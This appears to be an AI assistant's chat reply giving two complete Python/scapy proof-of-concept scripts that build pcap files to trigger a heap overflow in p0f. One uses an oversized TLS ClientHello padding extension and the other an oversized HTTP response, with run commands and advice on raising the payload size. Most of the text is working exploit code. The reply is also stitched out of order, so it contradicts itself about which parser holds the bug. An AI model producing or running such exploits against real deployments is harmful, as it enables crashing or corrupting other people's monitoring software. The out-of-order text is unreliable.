Good updates, two important corrections to the PoC then.

**On the 3rd ACK:** that's expected p0f behavior. The SYN and SYN-ACK carry the TCP fingerprint data p0f cares about. The bare ACK has no options to fingerprint so it doesn't generate output, but the flow state was tracked internally, which is why subsequent data packets get processed. The PoC is fine there.

**On the actual bug:** the dispatch is `if not http → process_tls`, and the overflow fires on the TLS ClientHello being copied into the fixed buffer. That changes the PoC significantly — destination port 443, client-side data, and a crafted ClientHello payload instead of an HTTP request:

```python
#!/usr/bin/env python3
# poc_tls.py — triggers overflow in process_tls() via oversized ClientHello
# authorized lab use only
from scapy.all import Ether, IP, TCP, Raw, wrpcap
import struct, os

CLI = "10.0.0.10"; SRV = "10.0.0.20"
CP, SP = 44444, 443          # TLS port — routes to process_tls not process_http
OVERSIZE = 2048              # > 1024 dest, < MAX_FLOW_DATA(8192)

cseq = 1000; sseq = 9000
pkts = []

def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    pkt = Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)
    if payload:
        pkt = pkt/Raw(payload)
    return pkt

# --- TCP handshake ---
pkts.append(seg(CLI, SRV, CP, SP, cseq, 0, "S"));              cseq += 1
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "SA"));          sseq += 1
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "A"))
# bare ACK — p0f tracks flow state but produces no output here, expected

# --- Craft oversized TLS ClientHello ---
# pad via a large session ID or repeated extensions to cross the 1024 dest boundary
# while staying under MAX_FLOW_DATA so the clamp doesn't save it

def build_clienthello(pad_size):
    # TLS random (32 bytes)
    random_bytes = os.urandom(32)

    # session ID — use 32 bytes (max valid length)
    session_id = os.urandom(32)

    # cipher suites — a few real ones
    ciphers = b"\xc0\x2c\xc0\x2b\xc0\x30\xc0\x2f\x00\x9f\x00\x9e"
    cipher_len = struct.pack("!H", len(ciphers))

    # compression methods
    comp = b"\x01\x00"

    # padding extension (type 0x0015) — this is where we stuff the size
    padding_data = b"\x00" * pad_size
    ext_padding = (b"\x00\x15" +                        # extension type: padding
                   struct.pack("!H", len(padding_data)) +
                   padding_data)

    # SNI extension
    sni_host = b"example.com"
    sni_ext = (b"\x00\x00" +                            # extension type: SNI
               struct.pack("!H", len(sni_host) + 5) +
               struct.pack("!H", len(sni_host) + 3) +
               b"\x00" +
               struct.pack("!H", len(sni_host)) +
               sni_host)

    extensions = sni_ext + ext_padding
    ext_len = struct.pack("!H", len(extensions))

    # ClientHello body
    hello_body = (b"\x03\x03" +                         # TLS 1.2 client version
                  random_bytes +
                  bytes([len(session_id)]) + session_id +
                  cipher_len + ciphers +
                  comp +
                  ext_len + extensions)

    # Handshake header: type=ClientHello(1), length (3 bytes)
    hs_hdr = b"\x01" + struct.pack("!I", len(hello_body))[1:]

    # TLS record layer: type=22 (handshake), version=TLS1.0, length
    record = (b"\x16\x03\x01" +
              struct.pack("!H", len(hs_hdr + hello_body)) +
              hs_hdr + hello_body)
    return record

clienthello = build_clienthello(OVERSIZE)
print(f"ClientHello record size: {len(clienthello)} bytes")

pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "PA", clienthello))
cseq += len(clienthello)

wrpcap("poc_tls.pcap", pkts)
print("wrote poc_tls.pcap")
```

Run it the same way:
```
python3 poc_tls.py
p0f -r poc_tls.pcap   # add ASan build or valgrind
```

**Key differences from the HTTP version:**

- Port 443 is what likely routes to `process_tls` in the dispatch check. If the dispatch is content-based rather than port-based (checks for TLS record byte `0x16`), the `build_clienthello()` structure handles that since it starts with a valid TLS record header.
- The ClientHello is client→server, so it lands in `f->request` / `req_len` side of the flow, not `f->response`. That matters because if the fixed buffer is on the request side the overflow fires on this first data segment. If `process_tls` mirrors the `process_http` response-side pattern and you need a ServerHello to trigger it, add one after the client hello with `seg(SRV, CLI, SP, CP, sseq, cseq, "PA", serverhello)`.
- The padding extension (`0x0015`) is a legitimate TLS extension designed exactly for padding, so it produces a well-formed ClientHello that passes any structure checks before the copy.

Two things to confirm when you're back at the binary: which side of the flow (`request` vs `response` buffer) the copy lands in, and whether the dispatch is port-based or content-based. Both change which segment triggers the overflow.

The honest version of what this PoC does: it confirms or refutes the theory. Under the conditions you described (copy inside `process_http`, fixed ~1024 destination, clamp still `MAX_FLOW_DATA`), it should trigger an ASan heap-write. If it doesn't fire, that's a real result too and probably means one of the three unverified assumptions was wrong. Treat a non-crash as informative, not as "try harder to break it."

The trigger condition is a single HTTP **response** segment whose payload exceeds the destination buffer (1024). But p0f's state machine won't parse a response until the flow looks like a real HTTP session, so the PoC has to walk the flow through the states you saw: SYN, SYN+ACK, an ACK, a client request (so `http_req_done` gets set), then the oversized server response in a data segment on an established flow. A lone big packet won't reach the vulnerable branch.

Here's a generator using scapy. It writes a pcap; you replay it offline, which is cleaner and more reproducible than live injection.

```python
#!/usr/bin/env python3
# poc_gen.py — builds a pcap that walks a flow to the HTTP response parse path
# with an oversized response segment. For authorized testing on your own box.
from scapy.all import Ether, IP, TCP, Raw, wrpcap

CLI = "10.0.0.10"; SRV = "10.0.0.20"
CP, SP = 44444, 80
OVERSIZE = 4096          # > 1024 dest, < MAX_FLOW_DATA(8192): isolates the dest-size bug

cseq = 1000; sseq = 9000
pkts = []
def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    return Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)/Raw(payload) if payload \
           else Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)

# handshake
pkts.append(seg(CLI, SRV, CP, SP, cseq, 0, "S"));            cseq += 1
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "SA"));        sseq += 1
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "A"))

# minimal client request so http_req_done is set
req = b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "PA", req));   cseq += len(req)
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "A"))

# oversized server response segment — the trigger
resp = b"HTTP/1.1 200 OK\r\nServer: " + b"A"*OVERSIZE + b"\r\n\r\n"
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "PA", resp))

wrpcap("poc.pcap", pkts)
print(f"wrote poc.pcap, response payload {len(resp)} bytes")
```

Run it against an ASan build of your target on the lab box:

```
python3 poc_gen.py
p0f -r poc.pcap
```

Notes that matter for whether it fires:

The response payload must land in one segment, since the overflow is per-`memcpy`. Keep it under `MAX_FLOW_DATA` (8192) but over 1024, so a crash points specifically at the destination-size mismatch rather than the general 8 KB cap. If nothing happens, bump `OVERSIZE` toward and past 8192 to check whether the outer clamp is doing anything at all.